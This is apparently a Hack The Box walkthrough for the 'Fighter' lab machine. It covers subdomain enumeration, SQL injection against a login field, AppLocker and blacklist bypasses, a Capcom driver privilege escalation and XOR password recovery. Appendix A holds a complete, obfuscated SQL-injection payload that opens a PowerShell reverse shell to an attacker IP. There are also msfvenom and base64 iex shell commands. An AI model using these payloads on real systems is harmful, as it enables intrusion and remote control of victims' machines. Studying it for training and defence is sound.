# Fighter

*Converted from: Fighter.pdf*

---

# Fighter
## **1 [st] November 2018 / Document No D18.100.24**

**Prepared By: egre55**

**Machine Author: decoder & Cneeliz**

**Difficulty: Insane**

**Classification: Official**


Page 1 / 14


## **SYNOPSIS**

Fighter is a very challenging machine, that requires good web and post-exploitation enumeration.

It highlights the fragility of blacklists and showcases techniques that are useful from both

offensive and defensive standpoints.


## **Skills Required**


  - Intermediate knowledge of Web

application enumeration techniques

  - Intermediate knowledge of SQL

injection techniques

  - Intermediate knowledge of Windows

  - Intermediate knowledge of

disassembly


## **Skills Learned**


  - Advanced SQL injection technique and

blacklist bypassing

  - AppLocker bypassing

  - Command-line obfuscation

  - Exploit selection and modification

  - Post-exploitation enumeration

  - Reverse engineering


Page 2 / 14


## **Enumeration** **Nmap**

masscan -p1-65535 10.10.10.72 --rate=1000 -e tun0 > ports


ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')


Nmap -Pn -sV -sC -p$ports 10.10.10.72


Nmap reveals an IIS 8.5 installation, which is only available on Windows Server 2012 R2.


Page 3 / 14


## **Wfuzz**

streetfighterclub.htb is referred to, and this is added to /etc/hosts. A member’s site is also

referred to but dirbusting this hostname using either a cewl generated list of words from the

website, or other popular wordlists is unsuccessful.


Possibly it has been configured as a subdomain. In order to test this we can add the words from

the cewl generated wordlist into /etc/hosts. Issuing “wc- l” on the wordlist returns that there are

254 entries. The contents of the wordlist are copied with the command “xclip -sel c < words”, and

pasted into /etc/hosts. With the cursor at the beginning of the first word, the following vim macro

can be used to format the remaining 253 entries appropriately.


qri10.10.10.72<tab><end>.streetfighterclub.htb<down arrow><home><esc>q253@r


Subdomain enumeration can be performed using Wfuzz.


wfuzz -c -z file,words --hc 404 -Z http://FUZZ.streetfighterclub.htb


This reveals that “members” is a valid subdomain, although as it is not directly accessible, it

seems an additional directory or file must be required.


Page 4 / 14


## **Gobuster**

Using Gobuster to enumerate further, the members area is quickly found.


go run /opt/gobuster/main.go -u http://members.streetfighterclub.htb -w

/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -s '200,204,301,302,307,403,500' -x

.htm,.html,.aspx,.asp


go run /opt/gobuster/main.go -u http://members.streetfighterclub.htb/old/ -w

/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -s '200,204,301,302,307,403,500' -x

.htm,.html,.aspx,.asp


Page 5 / 14


## **Exploitation** **Burp Suite / SQL injection**

Manipulation of the login request in Burp Repeater reveals that the “logintype” parameter is

vulnerable to SQL injection. The “ORDER BY” statement is incremented, which result in a 302

HTTP status code until “ORDER BY 7”, which confirms that there are 6 columns.


Page 6 / 14


After iterating through the column numbers with USER_NAME() as the payload, and examining

the HTTP response, it seems the information can be extracted by inputting the query in column 5.

After URL and base64 decoding the “Set-Cookie: Email” value, the response to the query is

visible. A response of “1” to “IS_SRVROLEMEMBER(‘sysadmin’) confirms that the account has

been granted sysadmin privileges.


Page 7 / 14


​


​


## **Payload creation**

After a lot of trial and error, and using the below article as inspiration, a payload is created to

enable xp_cmdshell and execute a Nishang PowerShell reverse shell one-liner **(Appendix A)** ​,.


[https://www.tarlogic.com/en/blog/red-team-tales-0x01/](https://www.tarlogic.com/en/blog/red-team-tales-0x01/)

[https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)


It is worth noting that:


  -  - and " characters need escaping


  - xp_cmdshell needs obfuscating to bypass a simple blacklist


  - The 32-bit version of PowerShell must be used


PowerShell is noted for its offensive capability and Microsoft have made later versions of the

language very security transparent (e.g. Module and Script Block logging). However,

organisations may also choose to block Powershell completely. The obvious Powershell binary

to block is below, and on Fighter this is blocked by AppLocker policy.


However, it is possible to instantiate a PowerShell session using other native PowerShell

executables and dlls **(Appendix B)** ​, and these should be blocked as well if required.


Although not necessary for this exploitation, it is worth additionally obfuscating the payload. The

example in Appendix A has a simple case-obfuscation applied, but for more sophisticated

PowerShell obfuscation, Daniel Bohannon has created the “Invoke-Obfuscation” project.


[https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)


After executing the payload, a reverse shell is received as FIGHTER\sqlserv.


Page 8 / 14



​


​


## **Post-Exploitation Enumeration** **Identification of vulnerable driver**

From both defensive and offensive perspectives, it is useful to see how a system has deviated

from a vanilla installation or previous baseline in terms of installed services and drivers. The

below commands can be used to enumerate services and drivers.


cmd /c sc query state= all type= all | findstr SERVICE_NAME

driverquery


As a previous baseline is not available, the server version is again confirmed, before standing up

a Windows Server 2012 instance from the Microsoft Evaluation Center.


[environment]::OSVersion.Version


After diffing the output from both systems, a much smaller list of services is identified. Among the

expected MSSQL and IIS services is the Capcom service/driver, which is known to be vulnerable.


Page 9 / 14


## **Privilege Escalation** **Upgrade PowerShell Shell**

Running exploits may result in system instability, so the bare PowerShell shell is upgraded to a

more forgiving Meterpreter shell.


msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=80 -f psh


The PowerShell payload is then base64 encoded and executed.


[System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("base64 encoded

powershell reverse shell")) | iex


Page 10 / 14


## **Capcom exploit**

Running the Capcom exploit results in a failed architecture check even though the architecture is

correct, so the check_result function is commented out.


After issuing a “reload” command, the exploit is run again and a new Meterpreter session running

as SYSTEM is received.


The user.txt flag can now be obtained from the decoder user’s desktop.


Page 11 / 14


## **Reversing root.exe**

root.exe and check.dll can be downloaded and opened in Ida. After inspection it seems that XOR

9 is applied to each byte of the string Fm`fEhOl}h.


GCHQ CyberChef’s XOR Brute Force can be used to recover the password OdioLaFeta.


After passing this to root.exe the root flag is returned.


Page 12 / 14


## **Appendix A**

logintype=1;EXEC sp_configure 'show advanced options', 1;RECONFIGURE WITH
OVERRIDE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE WITH OVERRIDE;drop table
fighter;create table fighter (out varchar(8000));insert into fighter (out) execute Xp_cMdsHelL
'C:\WIndOWs\sySwOw64\WINdOwspOweRshEll\v1.0\poWersHeLl.Exe "$clIEnT = NEw-ObJect
SYstEm.nEt.SOckEts.TcPclIeNt(\"10.10.14.15\",443);$stReAm =
$clIEnT.GetsTrEam();[byte[]]$bYtEs = 0..65535|%{0};wHIle(($i = $stReAm.Read($bYtEs, 0,
$bYtEs.LEnGth)) -ne 0){;$dAta = (NEW-oBjecT -TypeNAme
SYsTem.tExt.ASCIiENcoDing).GEtstRInG($bYtEs,0, $i);$sEndback = (iEX $data 2>&1 | OUt-stRing
);$Sendback2 = $sEndback + \"sH3lL \" + (pWd).PAth + \"^> \";$senDbyte =
([texT.eNCodIng]::AScIi).GEtByTes($Sendback2);$stReAm.WRite($senDbyte,0,$senDbyte.Lengt
h);$stReAm.FLuSh()};$clIEnT.CloSe()"';

_SQLi with case-obfuscated PowerShell reverse shell_


Page 13 / 14


## **Appendix B**

C:\>dir /B /S powershell.exe /S system.management.automation.dll

C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e
35\System.Management.Automation.dll
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.
0__31bf3856ad364e35\System.Management.Automation.dll
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\WinSxS\amd64_microsoft-windows-powershell-exe_31bf3856ad364e35_10.0.143
93.0_none_968a6a2f18e547eb\powershell.exe
C:\Windows\WinSxS\msil_system.management.automation_31bf3856ad364e35_1.0.0.0_none_
6340379543bd8a03\System.Management.Automation.dll
C:\Windows\WinSxS\msil_system.management.automation_31bf3856ad364e35_10.0.14393.0_
none_f2bad6783ea6eb6a\System.Management.Automation.dll
C:\Windows\WinSxS\wow64_microsoft-windows-powershell-exe_31bf3856ad364e35_10.0.143
93.0_none_a0df14814d4609e6\powershell.exe

_PowerShell: associated binaries and dlls_


Page 14 / 14


